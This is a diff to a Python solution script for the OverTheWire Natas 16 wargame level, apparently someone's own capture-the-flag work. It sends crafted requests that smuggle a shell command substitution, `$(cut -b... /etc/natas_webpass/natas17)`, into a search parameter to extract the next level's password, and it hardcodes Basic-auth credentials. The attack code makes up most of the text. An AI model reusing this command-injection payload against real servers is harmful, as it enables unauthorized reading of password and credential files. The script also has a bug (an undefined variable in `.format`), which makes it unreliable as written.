@@ -3,7 +3,7 @@ import re
 import math
 import time
 r_ex=re.compile(r"HTTP/1.1 200 OK")
-m_ex=re.compile(r"<pre>\n[A-Z]\n</pre>")
+m_ex=re.compile(r"<pre>\n^[A-Z]+\n</pre>")
 buf=bytearray()
 
 #the login for natas15 basic auth username & password are combined with a colon then utf-8 base64 is applied. This becomes Http header.
@@ -17,8 +17,8 @@ buf=bytearray()
 #open socket to send request
 s=socket.socket(family=socket.AF_INET,type=socket.SOCK_STREAM,proto=0)
 s.setblocking(1)
-s.settimeout(5.0)
-s.connect(("176.9.9.172",80))
+s.settimeout(10.0)
+s.connect(("natas16.natas.labs.overthewire.org",80))
 #now we can try hacking!!
 
 #we need to make effective request in a loop up to 32 characters long for the lenght of the password
@@ -33,7 +33,8 @@ Fails=0
 for c in range(1,32):
 	match=False
 	GotData=False
-	request=bytes("GET /index.php?needle=^%24(cut+-b{}+%2Fetc%2Fnatas_webpass%2Fnatas17)%24&submit=Search HTTP/1.1\r\nHost: natas16.natas.labs.overthewire.org\r\nAuthorization: BASIC bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==\r\n\r\n".format(b),"utf-8")
+#	request=bytes("GET /index.php?needle=^%24(cut+-b{}+%2Fetc%2Fnatas_webpass%2Fnatas17)%24&submit=Search HTTP/1.1\r\nHost: natas16.natas.labs.overthewire.org\r\nAuthorization: Basic bmF0YXMxNjpUUkQ3aVpyZDVnQVRqajlQa1BFdWFPbGZFakhxajMyVg==\r\n\r\n".format(b),"utf-8")
+	request=bytes("GET /index.php?needle=^%24(cut+-b{}+%2Fetc%2Fnatas_webpass%2Fnatas17)%24[a-z][a-z][a-z]&submit=Search HTTP/1.1\r\nHost: natas16.natas.labs.overthewire.org\r\nAuthorization: Basic bmF0YXMxNjpUUkQ3aVpyZDVnQVRqajlQa1BFdWFPbGZFakhxajMyVg==\r\n\r\n".format(b),"utf-8")
 	while GotData==False:
 		z=s.send(request)
 		#print("SENT: Only {} of {} bytes sent".format(z,len(request)))
@@ -47,7 +48,7 @@ for c in range(1,32):
 			s=socket.socket(family=socket.AF_INET,type=socket.SOCK_STREAM,proto=0)
 			s.setblocking(1)
 			s.settimeout(5.0)
-			s.connect(("176.9.9.172",80))
+			s.connect(("natas16.natas.labs.overthewire.org",80))
 			Fails=Fails+1
 			if Fails>3:
 				
@@ -58,7 +59,7 @@ for c in range(1,32):
 			GotData=True
 			Fails=0
 	str=buf.decode("utf-8")
-#	print(str+"\n--{end html}--",end="\n\n\n\n")
+	print(str+"\n--{end html}--",end="\n\n\n\n")
 	h=re.match(r_ex,str)
 	if h is not None:
 		m=re.search(m_ex,str)
